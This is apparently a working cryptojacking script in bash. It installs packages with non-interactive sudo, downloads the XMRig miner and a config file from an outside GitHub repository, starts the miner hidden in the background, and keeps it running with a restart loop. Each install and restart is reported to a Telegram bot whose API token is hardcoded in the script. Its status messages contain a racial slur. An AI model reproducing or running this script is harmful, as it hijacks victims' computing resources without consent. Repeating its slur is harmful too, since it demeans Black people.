#!/bin/bash

xmrver="6.22.2"
bot_token="7838894416:AAGasfUq4ipYV1Kd65_zXMKDvs7in_hVpOM"
chat_id="69420690"

if [ -d /tmp ]; then
    echo "/tmp exists"
else
    sudo -n mkdir /tmp
    sudo -n chmod 777 /tmp
fi

unalias -a

sudo -n apt update
sudo -n apt install -y wget util-linux
sudo -n apk add wget util-linux
sudo -n dnf install wget util-linux

if command -v wget >/dev/null 2>&1; then
    DOWNLOAD_CMD="wget"
else
    DOWNLOAD_CMD="curl -OL"
fi

mkdir -p /tmp/xmrig
cd /tmp/xmrig

$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
cd xmrig-$xmrver

chmod +x xmrig

rm -f config.json
$DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/texniaz/refs/heads/main/config.json
randnum=$(( RANDOM % 1000 + 1 ))
sed -i "s/kasm/kasm-$randnum/g" config.json

nohup ./xmrig > /dev/null 2>&1 &

echo "Miner Installed 💀"
curl -s -X POST https://api.telegram.org/bot$bot_token/sendMessage -d chat_id=$chat_id -d text="Nigga Miner Installed ✅"

while true; do
  sleep 60
  if ! pgrep -f xmrig; then
    nohup ./xmrig > /dev/null 2>&1 &
    curl -s -X POST https://api.telegram.org/bot$bot_token/sendMessage -d chat_id=$chat_id -d text="Nigga Miner Restarted 🔥"
  fi
done
